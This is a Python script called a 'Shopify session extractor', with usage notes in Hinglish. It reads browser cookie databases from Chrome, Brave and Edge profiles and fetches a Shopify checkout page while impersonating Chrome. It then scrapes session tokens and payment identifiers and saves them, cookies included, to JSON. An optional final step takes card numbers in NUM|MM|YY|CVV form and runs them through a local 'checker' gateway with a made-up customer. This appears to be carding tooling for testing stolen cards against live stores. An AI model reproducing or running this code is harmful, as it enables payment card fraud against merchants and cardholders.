"""
=============================================================
  SHOPIFY SESSION EXTRACTOR
  --------------------------
  Kaise use karein:
  1. Browser mein kisi bhi Shopify store pe jaao
  2. Product cart mein daalo
  3. Checkout / Payment page tak pahuncho
  4. Is script ko checkout URL ke saath chalao

  Usage:
    python session_extractor.py https://mood.design/checkouts/cn/XXXXX/en-us

  Agar sirf store URL hai to:
    python session_extractor.py https://mood.design
=============================================================
"""
import sys
import os
import re
import json
import sqlite3
import shutil
import asyncio
import tempfile
import aiohttp
from aiohttp import CookieJar
from pathlib import Path

# ── Try to import curl_cffi ───────────────────────────────────────────────────
try:
    from curl_cffi.requests import AsyncSession as CurlSession
    HAS_CURL = True
except ImportError:
    HAS_CURL = False
    print("[WARN] curl_cffi not installed — using aiohttp only")

# ── Chrome / Edge / Brave Cookie Paths (Windows) ─────────────────────────────
CHROME_COOKIE_PATHS = [
    Path(os.environ.get("LOCALAPPDATA", "")) / "Google/Chrome/User Data/Default/Network/Cookies",
    Path(os.environ.get("LOCALAPPDATA", "")) / "Google/Chrome/User Data/Default/Cookies",
    Path(os.environ.get("LOCALAPPDATA", "")) / "BraveSoftware/Brave-Browser/User Data/Default/Network/Cookies",
    Path(os.environ.get("LOCALAPPDATA", "")) / "Microsoft/Edge/User Data/Default/Network/Cookies",
]


def get_chrome_cookies_for_domain(domain: str) -> dict:
    """Read Chrome cookies for a given domain from SQLite database."""
    cookies = {}
    for cookie_db in CHROME_COOKIE_PATHS:
        if not cookie_db.exists():
            continue
        try:
            tmp = tempfile.mktemp(suffix=".db")
            shutil.copy2(str(cookie_db), tmp)
            con = sqlite3.connect(tmp)
            cur = con.cursor()
            domain_clean = domain.replace("https://", "").replace("http://", "").split("/")[0]
            base_domain = ".".join(domain_clean.split(".")[-2:])
            cur.execute(
                "SELECT name, value FROM cookies WHERE host_key LIKE ?",
                (f"%{base_domain}%",)
            )
            for name, value in cur.fetchall():
                if value:
                    cookies[name] = value
            con.close()
            os.unlink(tmp)
            if cookies:
                print(f"[OK] Chrome cookies loaded from: {cookie_db.parent.parent.name}")
                break
        except Exception as e:
            print(f"[WARN] Could not read cookies: {e}")
    return cookies


def extract_meta(html: str, key: str) -> str:
    patterns = [
        rf'"{key}"\s*:\s*"([^"]+)"',
        rf"'{key}'\s*:\s*'([^']+)'",
        rf'{key}["\s:=]+["\']([a-zA-Z0-9_\-]+)["\']',
    ]
    for pat in patterns:
        m = re.search(pat, html)
        if m:
            return m.group(1)
    return ""


def extract_payment_method_id(html: str) -> str:
    m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([a-f0-9]+)"', html)
    if m:
        return m.group(1)
    m = re.search(r'payment_method_id["\s:=]+["\']([a-f0-9]+)["\']', html)
    if m:
        return m.group(1)
    return ""


def extract_variant_id(html: str) -> str:
    m = re.search(r'gid://shopify/ProductVariant/(\d+)', html)
    if m:
        return m.group(1)
    m = re.search(r'"variantId"\s*:\s*"?(\d+)"?', html)
    if m:
        return m.group(1)
    return ""


def extract_price(html: str) -> str:
    m = re.search(r'"totalAmount"\s*:\s*\{[^}]*"amount"\s*:\s*"([0-9.]+)"', html)
    if m:
        return m.group(1)
    m = re.search(r'"price"\s*:\s*"([0-9.]+)"', html)
    if m:
        return m.group(1)
    return "1.00"


def extract_build_id(html: str) -> str:
    m = (
        re.search(r'"x-checkout-web-build-id"\s*:\s*"([a-f0-9]{40})"', html) or
        re.search(r'buildId["\s:=]+["\']([a-f0-9]{40})["\']', html)
    )
    return m.group(1) if m else ""


def extract_unique_id(html: str) -> str:
    m = re.search(r'"uniqueId"\s*:\s*"([a-f0-9]{32})"', html)
    return m.group(1) if m else ""


def extract_checkout_id_from_url(url: str) -> str:
    m = re.search(r'/checkouts/cn/([a-zA-Z0-9]+)', url)
    return m.group(1) if m else ""


def extract_locale_from_url(url: str) -> str:
    m = re.search(r'/checkouts/cn/[a-zA-Z0-9]+/([a-zA-Z0-9-]+)', url)
    return m.group(1) if m else "en"


async def fetch_checkout_html(url: str, cookies: dict) -> tuple:
    """Fetch checkout page and return (final_url, html)."""
    if "/checkouts/" not in url:
        url = url.rstrip("/") + "/checkout"

    print(f"[...] Fetching: {url}")

    if HAS_CURL:
        async with CurlSession(impersonate="chrome131", cookies=cookies, timeout=25) as s:
            r = await s.get(url, allow_redirects=True)
            return str(r.url), r.text
    else:
        jar = CookieJar(unsafe=True)
        async with aiohttp.ClientSession(cookie_jar=jar) as s:
            for k, v in cookies.items():
                jar.update_cookies({k: v})
            async with s.get(url, allow_redirects=True, ssl=False) as r:
                return str(r.url), await r.text(errors="ignore")


async def main():
    if len(sys.argv) < 2:
        print("\n  Usage: python session_extractor.py <checkout_url_or_store_url>\n")
        print("  Examples:")
        print("    python session_extractor.py https://mood.design")
        print("    python session_extractor.py https://brio4life.com/checkouts/cn/XXXX/en-us\n")
        sys.exit(1)

    input_url = sys.argv[1].strip()
    domain = input_url.replace("https://", "").replace("http://", "").split("/")[0]
    base_url = f"https://{domain}"

    print(f"\n{'='*60}")
    print(f"  SHOPIFY SESSION EXTRACTOR")
    print(f"{'='*60}")
    print(f"  Store : {base_url}")
    print(f"{'='*60}\n")

    # Step 1: Read Chrome cookies
    print("[1] Reading Chrome browser cookies...")
    cookies = get_chrome_cookies_for_domain(base_url)
    print(f"    Found {len(cookies)} cookies\n")

    if not cookies:
        print("[WARN] No Chrome cookies found!")
        print("       Make sure Chrome is running AND you have visited the checkout page.")
        print("       Note: Close Chrome FIRST so cookies DB is unlocked, then run script.\n")

    # Step 2: Fetch checkout page
    print("[2] Fetching checkout page with your browser session...")
    try:
        checkout_url, html = await fetch_checkout_html(input_url, cookies)
        print(f"    Final URL  : {checkout_url}")
        print(f"    HTML size  : {len(html):,} bytes\n")
    except Exception as e:
        print(f"[ERROR] Failed to fetch: {e}")
        sys.exit(1)

    # Step 3: Extract all data
    print("[3] Extracting checkout parameters...")

    checkout_id   = extract_meta(html, "sourceToken") or extract_checkout_id_from_url(checkout_url)
    session_token = extract_meta(html, "sessionToken")
    variant_id    = extract_variant_id(html)
    pay_method_id = extract_payment_method_id(html)
    price         = extract_price(html)
    build_id      = extract_build_id(html)
    unique_id     = extract_unique_id(html)
    locale        = extract_locale_from_url(checkout_url)

    m_currency = re.search(r'"currencyCode"\s*:\s*"([A-Z]{3})"', html)
    currency = m_currency.group(1) if m_currency else "USD"

    m_shop = re.search(r'"myshopifyDomain"\s*:\s*"([^"]+)"', html)
    shop_domain = m_shop.group(1) if m_shop else domain

    # Print extracted data
    print(f"\n{'─'*60}")
    print(f"  EXTRACTED DATA")
    print(f"{'─'*60}")
    print(f"  store_url      : {base_url}")
    print(f"  shop_domain    : {shop_domain}")
    print(f"  checkout_id    : {checkout_id or 'NOT FOUND ⚠'}")
    print(f"  session_token  : {(session_token[:40] + '...') if session_token else 'NOT FOUND ⚠'}")
    print(f"  variant_id     : {variant_id or 'NOT FOUND ⚠'}")
    print(f"  pay_method_id  : {pay_method_id or 'NOT FOUND ⚠'}")
    print(f"  price          : {price} {currency}")
    print(f"  build_id       : {(build_id[:20] + '...') if build_id else 'using default'}")
    print(f"  unique_id      : {unique_id or 'NOT FOUND'}")
    print(f"  locale         : {locale}")
    print(f"  cookies_count  : {len(cookies)}")
    print(f"{'─'*60}\n")

    # Step 4: Save to JSON
    result = {
        "base_url":          base_url,
        "shop_domain":       shop_domain,
        "checkout_url":      checkout_url,
        "checkout_id":       checkout_id,
        "session_token":     session_token,
        "variant_id":        int(variant_id) if variant_id and variant_id.isdigit() else variant_id,
        "payment_method_id": pay_method_id,
        "price":             price,
        "currency":          currency,
        "build_id":          build_id,
        "unique_id":         unique_id,
        "locale":            locale,
        "cookies":           cookies,
    }

    output_file = f"session_{domain.replace('.', '_')}.json"
    with open(output_file, "w", encoding="utf-8") as f:
        json.dump(result, f, indent=2, ensure_ascii=False)
    print(f"[4] Session saved to: {output_file}")

    # Step 5: Missing field warnings
    missing = []
    if not session_token:
        missing.append("session_token  → checkout JS nahi chala (payment page tak pahuncho)")
    if not variant_id:
        missing.append("variant_id     → product cart mein daalo pehle")
    if not pay_method_id:
        missing.append("payment_method_id → payment method select karo browser mein")

    if missing:
        print(f"\n[WARN] Missing fields:")
        for m in missing:
            print(f"       - {m}")
        print()
    else:
        print(f"\n[OK] All required fields extracted successfully!")

    # Step 6: Optional card test
    print(f"{'─'*60}")
    card_input = input("Card test karna hai? (NUM|MM|YY|CVV) ya Enter skip: ").strip()
    if card_input and "|" in card_input:
        parts = card_input.split("|")
        if len(parts) == 4:
            await run_card_check(result, *[p.strip() for p in parts])
        else:
            print("[WARN] Invalid card format. Use: 4111111111111111|12|25|123")


async def run_card_check(session_data: dict, num: str, mon: str, yr: str, cvv: str):
    """Run a full Shopify card check using extracted session data."""
    print(f"\n[CHECKING] {num}|{mon}|{yr}|{cvv} on {session_data['base_url']}\n")

    try:
        sys.path.insert(0, r"c:\Users\rdx27\Desktop\all bots\checker")
        from gateways.shopify_gate import _try_shopify_payments
        from core.parser import CardData

        store = {
            "base_url":          session_data["base_url"],
            "variant_id":        session_data["variant_id"],
            "price":             session_data["price"],
            "currency":          session_data["currency"],
            "payment_method_id": session_data["payment_method_id"],
        }

        card = CardData(number=num, month=mon, year=yr, cvv=cvv)
        customer = {
            "firstName": "John",  "lastName": "Doe",
            "email":     "john.doe@gmail.com",
            "address1":  "123 Main St", "address2": "",
            "city":      "New York",    "state":    "NY",
            "zip":       "10001",       "country":  "US",
            "phone":     "2125551234",
        }

        jar = CookieJar(unsafe=True)
        async with aiohttp.ClientSession(cookie_jar=jar) as http_session:
            result = await _try_shopify_payments(
                session=http_session,
                card=card,
                store=store,
                customer=customer,
                proxy=None,
            )

        print(f"\n{'='*50}")
        print(f"  RESULT")
        print(f"{'='*50}")
        print(f"  Status  : {result.status.name if hasattr(result.status, 'name') else result.status}")
        print(f"  Raw Code: {result.raw_code}")
        print(f"  Message : {result.message}")
        if result.extra and result.extra.get("receipt_url"):
            print(f"  Receipt : {result.extra['receipt_url']}")
        print(f"{'='*50}\n")

    except ImportError as e:
        print(f"[ERROR] Checker import failed: {e}")
        print(f"        Make sure this script is in: c:\\Users\\rdx27\\Desktop\\all bots\\checker\\")
    except Exception as e:
        print(f"[ERROR] Card check exception: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    asyncio.run(main())
